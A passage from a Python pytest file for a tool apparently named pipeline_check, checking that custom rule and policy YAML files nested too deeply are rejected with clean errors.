    with pytest.raises(CustomRuleError, match="too deeply nested"):
        load_custom_rules([str(rule_file)])


def test_bug_k_policy_deeply_nested_fails_clean(tmp_path):
    import pytest

    from pipeline_check.core.policies import PolicyError, _load_policy_file

    deep = "a:\n" + "".join("  " * i + "k:\n" for i in range(1, 600))
    policy_file = tmp_path / "policy.yml"
    policy_file.write_text(deep, encoding="utf-8")
    with pytest.raises(PolicyError, match="too deeply nested"):
        _load_policy_file(policy_file)
